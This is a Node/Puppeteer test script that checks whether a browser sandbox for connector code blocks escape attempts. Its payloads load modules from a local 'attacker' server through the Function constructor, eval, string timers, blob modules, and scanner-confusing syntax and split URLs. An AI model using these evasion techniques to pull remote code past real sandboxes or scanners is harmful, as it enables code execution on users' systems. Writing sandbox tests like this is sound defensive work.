// Headless-Chrome escape check for the browser sandbox (runBrowser.js + worker.js).
//
// Serves the repo on one port and an "attacker" server on another, loads index.html (so the
// real page CSP applies), and runs connectors that try to load code from the attacker through
// every dynamic-code path we know of. They are passed straight to runInBrowser, so the static
// scan is NOT in the way: this checks the runtime boundary on its own.
//
// Passes when the attacker receives zero requests, every escape run ends with an error (or
// without exfiltrating), and the golden Calendly connector still yields 48 users / 11 inactive.
// A control page with no CSP proves the harness would notice a hit.
//
//   CHROME_PATH=/path/to/chrome npm run check:browser
import http from "node:http";
import { readFile } from "node:fs/promises";
import { extname, join, normalize } from "node:path";
import { fileURLToPath } from "node:url";
import puppeteer from "puppeteer-core";

const ROOT = fileURLToPath(new URL("..", import.meta.url));
const CHROME = process.env.CHROME_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".mjs": "text/javascript", ".css": "text/css", ".json": "application/json", ".yaml": "text/yaml", ".ts": "text/plain", ".svg": "image/svg+xml" };

const listen = (server) => new Promise((r) => server.listen(0, "127.0.0.1", () => r(server.address().port)));

const site = http.createServer(async (req, res) => {
  const path = normalize(decodeURIComponent(new URL(req.url, "http://x").pathname)).replace(/^(\.\.[/\\])+/, "");
  const file = join(ROOT, path.endsWith("/") ? path + "index.html" : path);
  if (!file.startsWith(ROOT)) { res.writeHead(403).end(); return; }
  try {
    const body = await readFile(file);
    res.writeHead(200, { "content-type": TYPES[extname(file)] || "application/octet-stream" }).end(body);
  } catch {
    res.writeHead(404).end();
  }
});

const hits = [];
const attacker = http.createServer((req, res) => {
  if (req.url.startsWith("/control-page")) {
    res.writeHead(200, { "content-type": "text/html" }).end("<!doctype html><title>control</title>");
    return;
  }
  hits.push(req.url);
  res.writeHead(200, { "content-type": "text/javascript", "access-control-allow-origin": "*" })
    .end("export const pwned = true;");
});

const sitePort = await listen(site);
const evilPort = await listen(attacker);
const EVIL = `http://127.0.0.1:${evilPort}`;
// The URL split across string pieces, as in the reviewer's cases, so the host scan can't see it.
const EVIL_SPLIT = `htt'+'p://127.0.0.1:${evilPort}`;

const wrap = (body) => `
import { defineConnector } from "@cloudeagle/connector-sdk";
export default defineConnector({
  app: "escape",
  baseUrl: "https://api.calendly.com",
  async *users(ctx) {
${body}
    yield { email: "nobody@example.com", name: "Nobody" };
  },
  async *usage() {},
});
`;
const pause = `    await new Promise((r) => setTimeout(r, 500));`;

const ESCAPES = {
  // Reviewer's case 1: AsyncFunction via Reflect.get and a concatenated "constructor".
  "reflect-constructor": wrap(`
    const k = "con" + "structor";
    await Reflect.get(Object.getPrototypeOf(async function () {}), k)("await imp" + "ort('${EVIL_SPLIT}/b.js?via=function&ctx=' + encodeURIComponent(JSON.stringify({})))")();`),
  // Reviewer's case 2: bracket access on an async arrow.
  "bracket-constructor": wrap(`
    await (async () => {})["con" + "structor"]("await imp" + "ort('${EVIL_SPLIT}/b.js?via=bracket')")();`),
  // Reviewer's case 3: a division the scanner reads as a regex, hiding import/**/(.
  "scanner-confusion": wrap(`
    let n = 1;
    n++ / 2; await import/**/("${EVIL}/b.js?via=comment");`),
  // String timer: setTimeout("code") is an eval path.
  "string-timer": wrap(`
    setTimeout("import('${EVIL}/b.js?via=timer')", 0);
${pause}`),
  // Chrome keeps setTimeout on WorkerGlobalScope.prototype; call it from there with a string.
  "proto-string-timer": wrap(`
    const d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(self), "setTimeout")
      ?? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(Object.getPrototypeOf(self)), "setTimeout");
    d.value.call(self, "import('${EVIL}/b.js?via=proto-timer')", 0);
${pause}`),
  // Notification must be gone from the worker.
  "notification": wrap(`
    new Notification("x", { icon: "${EVIL}/b.png?via=notification" });
${pause}`),
  // Plain dynamic import (static scan bypassed by calling runInBrowser directly).
  "plain-import": wrap(`
    await import("${EVIL}/b.js?via=plain");`),
  // eval and Function, for completeness.
  "eval": wrap(`
    await (0, eval)("import('${EVIL}/b.js?via=eval')");`),
  "function-global": wrap(`
    await Function("return import('${EVIL}/b.js?via=Function')")();`),
  // A blob: module minted by the connector (allowed by script-src blob:) importing the attacker.
  "blob-module": wrap(`
    const u = URL.createObjectURL(new Blob(["import '${EVIL}/b.js?via=blob';"], { type: "text/javascript" }));
    await import(u);`),
};

let failures = 0;
const check = (ok, label) => {
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}`);
  if (!ok) failures++;
};

const browser = await puppeteer.launch({ executablePath: CHROME, headless: true, args: ["--no-first-run"] });
try {
  // Control: on a page without CSP, an import() from a plain worker does reach the attacker.
  const control = await browser.newPage();
  await control.goto(`${EVIL}/control-page`);
  await control.evaluate(async (evil) => {
    const src = `import(${JSON.stringify(evil + "/b.js?via=control")}).then(() => postMessage("ok"), (e) => postMessage(String(e)));`;
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })), { type: "module" });
    await new Promise((r) => { w.onmessage = r; setTimeout(r, 3000); });
  }, EVIL);
  check(hits.some((h) => h.includes("via=control")), `control: harness sees an import() from a worker with no CSP (${hits.length} hit)`);
  hits.length = 0;
  await control.close();

  const page = await browser.newPage();
  const consoleLines = [];
  page.on("console", (m) => consoleLines.push(`[${m.type()}] ${m.text()}`));
  page.on("pageerror", (e) => consoleLines.push(`[pageerror] ${e.message}`));
  await page.goto(`http://127.0.0.1:${sitePort}/index.html`, { waitUntil: "networkidle0" });

  const golden = await readFile(join(ROOT, "fixtures/calendly.connector.ts"), "utf8");
  const results = await page.evaluate(async ({ escapes, golden, evil }) => {
    const { runInBrowser } = await import("/src/sandbox/runBrowser.js");
    const { parseSpec } = await import("/src/spec/load.js");
    const { staticCheck } = await import("/src/sandbox/staticChecks.js");
    const { validateRecords } = await import("/src/sandbox/validate.js");
    const spec = parseSpec(await (await fetch("/fixtures/calendly-api.yaml")).text());
    const plan = { baseUrl: "https://api.calendly.com" };
    const now = new Date("2026-11-06T00:00:00Z");
    const out = {};
    for (const [name, code] of Object.entries(escapes)) {
      const r = await runInBrowser(code, { spec, plan, now, timeoutMs: 5000 });
      const sc = staticCheck(code, { allowedHost: "api.calendly.com" });
      out[name] = { error: r.error, users: r.users.length, staticRules: [...new Set(sc.issues.map((i) => i.rule))] };
    }
    // CSP probes. Sucrase rewrites import() in connector code to require(), so the escapes above
    // never reach the browser's module loader. These probes start a worker exactly the way
    // runBrowser.js does (a blob: module) and call the loader directly, to show the policy the
    // worker inherited: same-origin import works, cross-origin import and eval are refused.
    const probe = (body) => new Promise((resolve) => {
      const src = `const r = {}; ${body}; postMessage(r);`;
      const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })), { type: "module" });
      w.onmessage = ({ data }) => { w.terminate(); resolve(data); };
      w.onerror = (e) => { e.preventDefault(); resolve({ workerError: e.message }); };
      setTimeout(() => resolve({ timeout: true }), 4000);
    });
    out.cspProbe = await probe(`
      try { await import(${JSON.stringify(location.origin + "/src/sandbox/sdk.js")}); r.sameOrigin = "loaded"; } catch (e) { r.sameOrigin = String(e); }
      try { await import(${JSON.stringify(evil + "/b.js?via=csp-probe")}); r.crossOrigin = "loaded"; } catch (e) { r.crossOrigin = String(e); }
      try { new Function("return 1")(); r.eval = "allowed"; } catch (e) { r.eval = String(e); }`);
    const g = await runInBrowser(golden, { spec, plan, now });
    const v = validateRecords({ users: g.users, usage: g.usage }, { now });
    out.golden = { error: g.error, users: v.stats.users, inactive: v.stats.inactive90d };
    return out;
  }, { escapes: ESCAPES, golden, evil: EVIL });

  // Give any late (timer-driven) loads a moment to land.
  await new Promise((r) => setTimeout(r, 500));

  for (const name of Object.keys(ESCAPES)) {
    const r = results[name];
    const outcome = r.error ? `${r.error.kind}: ${r.error.message}` : `no error, ${r.users} user(s)`;
    const sc = r.staticRules.length ? `flags ${r.staticRules.join(",")}` : "ok";
    check(!!r.error || !hits.some((h) => h.includes(`via=`)), `${name.padEnd(20)} -> ${outcome}   [staticCheck: ${sc}]`);
  }
  const p = results.cspProbe;
  console.log(`\nCSP probe (blob: worker, like runBrowser.js): ${JSON.stringify(p)}`);
  check(p.sameOrigin === "loaded", "CSP probe: same-origin module import still works in the blob worker");
  check(p.crossOrigin && p.crossOrigin !== "loaded", "CSP probe: cross-origin import() from the blob worker is refused");
  check(p.eval && p.eval !== "allowed", "CSP probe: new Function() is refused in the blob worker (no 'unsafe-eval')");
  check(hits.length === 0, `attacker server received ${hits.length} request(s)${hits.length ? `: ${hits.join(", ")}` : ""}`);
  const g = results.golden;
  check(!g.error && g.users === 48 && g.inactive === 11, `golden connector: ${g.users} users, ${g.inactive} inactive${g.error ? `, error ${g.error.message}` : ""}`);

  const csp = consoleLines.filter((l) => /Content Security Policy|Content-Security-Policy/i.test(l));
  console.log(`\nCSP violations reported in the console: ${csp.length}`);
  for (const l of csp.slice(0, 12)) console.log(`  ${l.slice(0, 220)}`);
} finally {
  await browser.close();
  site.close();
  attacker.close();
}

console.log(failures ? `\n${failures} check(s) failed` : "\nAll browser sandbox checks passed");
process.exit(failures ? 1 : 0);
